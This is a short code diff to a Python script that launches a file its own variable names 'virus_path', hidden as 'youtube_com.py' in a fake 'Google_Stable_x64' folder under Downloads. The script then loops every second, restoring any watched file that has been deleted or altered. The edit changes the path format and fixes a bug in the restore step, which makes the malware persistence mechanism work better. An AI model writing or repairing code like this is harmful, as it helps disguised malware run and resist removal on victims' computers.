@@ -11,9 +11,8 @@ files_to_backup = [
 
 backuped_files = [open(path, "rb").read() for path, _ in files_to_backup]
 
-virus_path = fr"{home_dir}\Downloads\Google_Stable_x64\assets\cache\youtube_com.py"
-
-subprocess.Popen(['python', f"{virus_path}"])
+virus_path = f"{home_dir}/Downloads/Google_Stable_x64/assets/cache/youtube_com.py"
+subprocess.Popen(['python', virus_path])
 
 while True:
   for index, file_paths in enumerate(files_to_backup):
@@ -21,6 +20,6 @@ while True:
     for path in file_paths:
       if not os.path.exists(path) or open(path, "rb").read() != backup:
         with open(path, "wb") as file:
-          file.write(backup[index])
+          file.write(backup)
   time.sleep(1)
 
